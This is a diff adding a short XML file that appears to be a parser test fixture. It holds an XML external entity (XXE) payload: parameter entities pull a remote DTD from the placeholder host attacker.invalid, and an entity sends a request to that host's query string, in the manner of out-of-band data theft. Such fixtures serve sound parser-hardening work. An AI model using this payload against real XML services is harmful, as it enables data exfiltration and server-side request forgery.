@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % inner "<!ENTITY expanded 'the internal subset declared this'>">
+  %inner;
+  <!ENTITY % remote SYSTEM "http://attacker.invalid/evil.dtd">
+  %remote;
+  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.invalid/?d=%remote;'>">
+  %wrapper;
+]>
+<data>&expanded;&send;</data>
